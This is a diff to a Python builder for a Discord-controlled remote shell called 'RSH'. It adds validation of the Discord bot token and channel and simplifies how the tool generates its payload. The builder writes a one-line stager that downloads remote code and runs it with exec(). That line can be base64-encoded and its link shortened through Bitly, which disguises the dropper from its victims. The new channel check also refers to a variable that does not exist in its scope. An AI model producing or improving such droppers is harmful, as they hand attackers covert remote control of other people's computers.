@@ -14,7 +14,7 @@ def sinput(string):
         color=Colors.red_to_purple, 
         interval=0.015,
         hide_cursor=False,
-        input_color=Colors.light_gray
+        input_color=Colors.dark_gray
     )
 
 def choice_input(string, answers=["y", "n"]):
@@ -38,6 +38,17 @@ def display_title():
     output = "\n\n"+"\n".join(["    "+title_lines[i]+spaces+pic_lines[i]+"    " for i in range(len(pic_lines))])+"\n\n\n\n"
 
     return Colorate.Vertical(Colors.red_to_black, output, 2)
+
+
+def check_token(token):
+    auth = {"authorization": "Bot "+token}
+    response = get("https://discord.com/api/users/@me/guilds", headers=auth)
+    return response.reason == "OK"
+
+def check_channel_id(id):
+    auth = {"authorization": "Bot "+token}
+    response = get(f"https://discord.com/api/channels/{id}", headers=auth)
+    return response.reason == "OK"
 
 
 def build():
@@ -91,11 +102,8 @@ def build():
 
             file_url = resp.json().get("link")
 
-        if module == "requests":
-            content = f"exec(__import__('requests').get('{file_url}').text)"
 
-        if module == "urllib":
-            content = f"exec(__import__('urllib.request').request.urlopen('{file_url}').read().decode())"
+        content = f"exec(__import__('requests').get('{file_url}').text)"
 
         if encoding == "base64":
             encoded_output = b64encode(content.encode()).decode()
@@ -119,7 +127,17 @@ def main():
     global is_hosted
 
     token = sinput("Enter the token of the bot > ")
+
+    if not check_token(token):
+        sinput("ERROR ! Token isn't valid !")
+        exit()
+
     channel_id = sinput("Enter the channel ID > ")
+
+    if not check_channel_id(channel_id):
+        sinput("ERROR ! Channel ID isn't valid !")
+        exit()
+
     is_hosted = choice_input("Do you want to host RSH")
 
     if is_hosted:
@@ -137,9 +155,6 @@ def main():
         if is_shorted:
             global bitly_key
             bitly_key = sinput("Enter you'r Bitly API key > ")
-
-        global module
-        module = choice_input("What module do you want to use", ["requests", "urllib"])
 
         global is_encoded
         is_encoded = choice_input("Do you want to encode your output")
